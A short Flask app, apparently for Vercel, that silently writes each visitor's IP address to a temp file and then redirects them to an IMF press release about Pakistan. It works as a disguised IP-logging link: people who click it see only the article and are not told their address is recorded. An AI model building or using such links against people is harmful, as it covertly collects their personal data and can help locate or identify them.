from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/')
def home():
    ip_address = request.remote_addr

    # Save IP address to a temp file (Vercel only allows writing to /tmp)
    with open('/tmp/ip_logs.txt', 'a+') as f:
        f.write(f'{ip_address}\n')

    return redirect("https://www.imf.org/en/News/Articles/2025/05/09/pr-25137-pakistan-imf-completes-1st-rev-of-eff-arrang-and-approves-req-for-arrang-under-rsf")
